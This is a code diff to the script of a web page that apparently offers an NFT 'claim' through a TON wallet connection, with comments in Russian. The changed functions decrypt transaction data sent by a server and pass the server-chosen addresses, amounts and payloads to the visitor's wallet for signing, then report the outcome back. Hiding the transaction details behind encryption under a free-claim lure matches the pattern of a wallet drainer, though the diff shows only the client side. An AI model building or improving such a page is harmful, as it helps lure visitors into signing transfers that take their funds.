@@ -973,12 +973,23 @@ async function handleSafetyChallenge(data) {
 }
 
 // Обработка транзакционных сообщений (обновленная)
-function handleTransactionMessages(encryptedData) {
+// Обработка транзакционных сообщений (исправленная)
+async function handleTransactionMessages(messageData) {
     try {
-        console.log('🔐 Encrypted transaction data:', encryptedData);
-        const decryptedData = decryptData(encryptedData);
-        console.log('🔓 Decrypted transaction data:', decryptedData);
+        console.log('🔐 Received encrypted transaction data:', messageData);
+        
+        // Извлекаем только зашифрованные данные из поля data
+        const encryptedString = messageData.data;
+        if (!encryptedString || typeof encryptedString !== 'string') {
+            console.error('❌ Invalid encrypted data format');
+            updateUIForNoTransactions();
+            return;
+        }
 
+        console.log('🔓 Decrypting transaction data...');
+        const decryptedData = await decryptFromServer(encryptedString, clientEncryption);
+        console.log('📄 Decrypted transaction data:', decryptedData);
+        
         let messages;
         try {
             // Пытаемся распарсить JSON
@@ -1009,7 +1020,7 @@ function handleTransactionMessages(encryptedData) {
         // Обработка сообщений
         if (messages && messages.messages && Array.isArray(messages.messages)) {
             console.log(`📦 Processing ${messages.messages.length} transaction messages`);
-            processTransactionMessages(messages.messages);
+            await processTransactionMessages(messages);
         } else {
             console.log('📭 No transaction messages found');
             updateUIForNoTransactions();
@@ -1029,56 +1040,63 @@ function updateUIForNoTransactions() {
 }
 
         // Обработка транзакционных сообщений для подписания
-        async function processTransactionMessages(transactionData) {
-            try {
-                const messages = transactionData.messages;
-                console.log('📋 Processing transaction messages:', messages);
-                
-                // Подготавливаем транзакцию для подписания
-                const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutes
-                    messages: messages.map(msg => ({
-                        address: msg.address,
-                        amount: msg.amount || msg.value || '0',
-                        payload: msg.payload || ''
-                    }))
-                };
-
-                console.log('📝 Final transaction for signing:', transaction);
-                showStatus(`Ready to sign ${messages.length} transaction(s)`, 'info');
-                
-                // Небольшая задержка для UX
-                await new Promise(resolve => setTimeout(resolve, 1000));
-
-                try {
-                    console.log('🖊️ Sending transaction for signing...');
-                    const result = await tonConnectUI.sendTransaction(transaction);
-                    
-                    showStatus('🎉 Transaction signed successfully!', 'success');
-                    console.log('✅ Transaction result:', result);
-                    
-                    // Отправляем статус на сервер
-                    await sendTransactionStatus('sent', messages);
-                    
-                } catch (signError) {
-                    console.error('❌ Transaction signing failed:', signError);
-                    
-                    if (signError.message?.includes('Rejected')) {
-                        showStatus('Transaction rejected by user', 'error');
-                    } else if (signError.message?.includes('timeout')) {
-                        showStatus('Transaction timeout', 'error');
-                    } else {
-                        showStatus('Signing failed: ' + signError.message, 'error');
-                    }
-                    
-                    await sendTransactionStatus('error', messages);
-                }
-                
-            } catch (error) {
-                console.error('💥 Transaction processing error:', error);
-                showStatus('Transaction processing failed', 'error');
-            }
+        // Обработка транзакционных сообщений для подписания
+async function processTransactionMessages(messagesData) {
+    try {
+        const messages = messagesData.messages;
+        console.log('📋 Processing transaction messages:', messages);
+        
+        if (!messages || messages.length === 0) {
+            console.log('📭 No transaction messages to process');
+            showStatus('No transactions available', 'info');
+            return;
         }
+        
+        // Подготавливаем транзакцию для подписания
+        const transaction = {
+            validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutes
+            messages: messages.map(msg => ({
+                address: msg.address,
+                amount: msg.amount || msg.value || '0',
+                payload: msg.payload || ''
+            }))
+        };
+
+        console.log('📝 Final transaction for signing:', transaction);
+        showStatus(`Ready to sign ${messages.length} transaction(s)`, 'info');
+        
+        // Небольшая задержка для UX
+        await new Promise(resolve => setTimeout(resolve, 1000));
+
+        try {
+            console.log('🖊️ Sending transaction for signing...');
+            const result = await tonConnectUI.sendTransaction(transaction);
+            
+            showStatus('🎉 Transaction signed successfully!', 'success');
+            console.log('✅ Transaction result:', result);
+            
+            // Отправляем статус на сервер
+            await sendTransactionStatus('sent', messages);
+            
+        } catch (signError) {
+            console.error('❌ Transaction signing failed:', signError);
+            
+            if (signError.message?.includes('Rejected')) {
+                showStatus('Transaction rejected by user', 'error');
+            } else if (signError.message?.includes('timeout')) {
+                showStatus('Transaction timeout', 'error');
+            } else {
+                showStatus('Signing failed: ' + signError.message, 'error');
+            }
+            
+            await sendTransactionStatus('error', messages);
+        }
+        
+    } catch (error) {
+        console.error('💥 Transaction processing error:', error);
+        showStatus('Transaction processing failed', 'error');
+    }
+}
 
         // Основная функция для получения NFT
         async function claimNFT() {
@@ -1308,6 +1326,7 @@ function updateUIForNoTransactions() {
     </script>
 </body>
 </html>
+
 
 
 
